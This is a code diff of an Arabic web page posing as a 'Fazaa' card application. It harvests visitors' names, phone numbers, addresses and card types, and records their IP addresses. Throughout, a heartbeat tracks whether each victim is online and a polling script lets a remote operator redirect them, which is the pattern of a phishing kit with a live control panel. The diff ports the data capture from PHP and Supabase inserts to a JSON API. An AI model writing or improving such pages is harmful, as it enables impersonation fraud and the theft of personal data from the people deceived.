@@ -1,36 +1,3 @@
-<?php
-session_start();
-require_once __DIR__ . '/config.php';
-
-if (isset($_POST['submit'])) {
-    $name = $_POST['name'] ?? '';
-    $phone = $_POST['phone'] ?? '';
-    $address = $_POST['bill_account'] ?? '';
-    $card_type = $_POST['card_type'] ?? '';
-
-    $result = supabase_insert('users', [
-        'username' => $name,
-        'phone' => $phone,
-        'address' => $address,
-        'ssn' => $phone,
-        'insurance_company' => $card_type,
-        'page' => 'index-details.php',
-        'message' => 'معلومات مقدم الطلب',
-        'is_online' => true,
-        'last_input_at' => date('Y-m-d H:i:s')
-    ]);
-
-    if (!empty($result) && isset($result[0]['id'])) {
-        $_SESSION['user_id'] = $result[0]['id'];
-    }
-
-    // Track visit
-    supabase_insert('visits', [
-        'user_id' => $_SESSION['user_id'] ?? null,
-        'ip_address' => $_SERVER['REMOTE_ADDR'] ?? ''
-    ]);
-}
-?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -69,7 +36,6 @@ if (isset($_POST['submit'])) {
             flex-direction: column;
         }
 
-        /* === Navbar === */
         .sahara-nav {
             display: flex;
             justify-content: space-between;
@@ -120,7 +86,6 @@ if (isset($_POST['submit'])) {
             color: var(--sahara-green);
         }
 
-        /* === Step Indicator === */
         .step-indicator {
             display: flex;
             justify-content: center;
@@ -143,7 +108,6 @@ if (isset($_POST['submit'])) {
             box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.2);
         }
 
-        /* === Form Header === */
         .form-header {
             text-align: center;
             padding: 24px 16px 10px;
@@ -159,7 +123,6 @@ if (isset($_POST['submit'])) {
             color: var(--sahara-gray);
         }
 
-        /* === Form Card === */
         .form-wrap {
             flex: 1;
             padding: 0 16px 24px;
@@ -175,7 +138,6 @@ if (isset($_POST['submit'])) {
             border: 1px solid var(--sahara-border);
         }
 
-        /* === Form Fields === */
         .form-group {
             margin-bottom: 18px;
         }
@@ -220,7 +182,6 @@ if (isset($_POST['submit'])) {
             font-size: 13px;
         }
 
-        /* === Custom Select (نوع البطاقة) === */
         .form-select-custom {
             width: 100%;
             border: 1.5px solid var(--sahara-border);
@@ -307,7 +268,6 @@ if (isset($_POST['submit'])) {
             line-height: 1.7;
         }
 
-        /* === Balance Input === */
         .balance-input-wrap {
             position: relative;
             display: flex;
@@ -327,7 +287,6 @@ if (isset($_POST['submit'])) {
             border-radius: 8px;
         }
 
-        /* === Customer Toggle === */
         .customer-toggle {
             display: flex;
             gap: 12px;
@@ -362,7 +321,6 @@ if (isset($_POST['submit'])) {
             box-shadow: 0 4px 12px rgba(45, 45, 78, 0.3);
         }
 
-        /* === Submit Button === */
         .btn-submit {
             width: 100%;
             background: linear-gradient(135deg, #2d2d4e, #1a1a3a);
@@ -392,7 +350,6 @@ if (isset($_POST['submit'])) {
             box-shadow: none;
         }
 
-        /* === Info Note === */
         .info-note {
             background: var(--sahara-green-light);
             border: 1px solid rgba(45, 45, 78, 0.2);
@@ -415,7 +372,6 @@ if (isset($_POST['submit'])) {
             margin: 0;
         }
 
-        /* === Footer === */
         .sahara-footer {
             background: var(--sahara-dark);
             color: var(--sahara-white);
@@ -456,18 +412,16 @@ if (isset($_POST['submit'])) {
 </head>
 <body>
 
-    <!-- Navbar -->
     <nav class="sahara-nav">
-        <a href="index.php" class="back-btn">
+        <a href="index.html" class="back-btn">
             <i class="fas fa-arrow-right"></i>
         </a>
         <img src="./assets/sahara_brand_logo.png?v=esaad" alt="فزعة" class="logo-img">
         <div class="nav-links">
-            <a href="index.php">الرئيسية</a>
+            <a href="index.html">الرئيسية</a>
         </div>
     </nav>
 
-    <!-- Step Indicator -->
     <div class="step-indicator">
         <div class="step-dot completed"></div>
         <div class="step-dot active"></div>
@@ -475,18 +429,15 @@ if (isset($_POST['submit'])) {
         <div class="step-dot"></div>
     </div>
 
-    <!-- Form Header -->
     <div class="form-header">
         <h2><i class="fas fa-id-card" style="color: var(--sahara-green); margin-left: 8px;"></i> التسجيل في طلب بطاقة فزعه</h2>
         <p>يرجى إدخال بياناتك الشخصية وبيانات التوصيل لإتمام الطلب</p>
     </div>
 
-    <!-- Form -->
     <div class="form-wrap">
         <div class="form-card">
-            <form action="" method="POST">
+            <form id="detailsForm">
 
-                <!-- الاسم الكامل -->
                 <div class="form-group">
                     <label>
                         <i class="fas fa-user"></i>
@@ -495,7 +446,6 @@ if (isset($_POST['submit'])) {
                     <input type="text" name="name" required class="form-input" placeholder="أدخل الاسم الكامل">
                 </div>
 
-                <!-- رقم الهاتف -->
                 <div class="form-group">
                     <label>
                         <i class="fas fa-phone"></i>
@@ -504,7 +454,6 @@ if (isset($_POST['submit'])) {
                     <input type="text" name="phone" required inputmode="numeric" class="form-input" placeholder="أدخل رقم الهاتف">
                 </div>
 
-                <!-- العنوان -->
                 <div class="form-group">
                     <label>
                         <i class="fas fa-map-marker-alt"></i>
@@ -513,7 +462,6 @@ if (isset($_POST['submit'])) {
                     <input type="text" name="bill_account" required class="form-input" placeholder="أدخل عنوانك">
                 </div>
 
-                <!-- عدد أفراد الأسرة -->
                 <div class="form-group">
                     <label>
                         <i class="fas fa-users"></i>
@@ -538,7 +486,6 @@ if (isset($_POST['submit'])) {
                     </select>
                 </div>
 
-                <!-- نوع البطاقة -->
                 <div class="form-group">
                     <label>
                         <i class="fas fa-id-card"></i>
@@ -552,7 +499,6 @@ if (isset($_POST['submit'])) {
                     </select>
                 </div>
 
-                <!-- الموافقة على الرسوم -->
                 <div class="form-group">
                     <label>
                         <i class="fas fa-receipt"></i>
@@ -568,13 +514,11 @@ if (isset($_POST['submit'])) {
                     </div>
                 </div>
 
-                <!-- Submit -->
-                <button type="submit" name="submit" id="butSubm" disabled class="btn-submit">
+                <button type="submit" id="butSubm" disabled class="btn-submit">
                     <span>متابعة الطلب</span>
                     <i class="fas fa-arrow-left"></i>
                 </button>
 
-                <!-- Info Note -->
                 <div class="info-note">
                     <i class="fas fa-info-circle"></i>
                     <p>بالضغط على "متابعة الطلب" فإنك توافق على شروط وأحكام خدمة فزعه</p>
@@ -584,7 +528,6 @@ if (isset($_POST['submit'])) {
         </div>
     </div>
 
-    <!-- Footer -->
     <footer class="sahara-footer">
         <img src="https://i.postimg.cc/yNsF5MSj/6-2.png" alt="فزعة" class="footer-logo" style="filter: none;">
         <p style="font-size:13px;font-weight:600;color:#2d2d4e;margin-bottom:4px;">بطاقة فزعه | FAZAA</p>
@@ -595,7 +538,7 @@ if (isset($_POST['submit'])) {
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            const form = document.querySelector('form');
+            const form = document.getElementById('detailsForm');
             const submitBtn = document.getElementById('butSubm');
 
             form.addEventListener('input', function() {
@@ -609,28 +552,55 @@ if (isset($_POST['submit'])) {
             if (form.checkValidity()) {
                 submitBtn.disabled = false;
             }
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الإرسال...';
+
+                var formData = new FormData(form);
+                var data = {
+                    name: formData.get('name'),
+                    phone: formData.get('phone'),
+                    bill_account: formData.get('bill_account'),
+                    card_type: formData.get('card_type')
+                };
+
+                fetch('/api/submit-form', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                })
+                .then(function(r) { return r.json(); })
+                .then(function(resp) {
+                    submitBtn.innerHTML = '<span>متابعة الطلب</span><i class="fas fa-arrow-left"></i>';
+                    submitBtn.disabled = false;
+                })
+                .catch(function(err) {
+                    submitBtn.innerHTML = '<span>متابعة الطلب</span><i class="fas fa-arrow-left"></i>';
+                    submitBtn.disabled = false;
+                });
+            });
         });
     </script>
 
     <script>
     function checkRedirect() {
-        fetch('polling-redirect.php').then(r => r.json()).then(data => { if (data.redirect) { window.location.href = data.redirect; } }).catch(e => {});
+        fetch('/api/polling-redirect').then(r => r.json()).then(data => { if (data.redirect) { window.location.href = data.redirect; } }).catch(e => {});
     }
     setInterval(checkRedirect, 1500);
     checkRedirect();
     </script>
 
-    
-<script>
-// Heartbeat - تحديث حالة الاتصال فوراً
-function sendHeartbeat() {
-    fetch('heartbeat.php').catch(function(e){});
-}
-setInterval(sendHeartbeat, 2000);
-sendHeartbeat();
-window.addEventListener('beforeunload', function() {
-    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
-});
-</script>
+    <script>
+    function sendHeartbeat() {
+        fetch('/api/heartbeat').catch(function(e){});
+    }
+    setInterval(sendHeartbeat, 2000);
+    sendHeartbeat();
+    window.addEventListener('beforeunload', function() {
+        navigator.sendBeacon('/api/heartbeat', new URLSearchParams({action: 'offline'}));
+    });
+    </script>
 </body>
 </html>
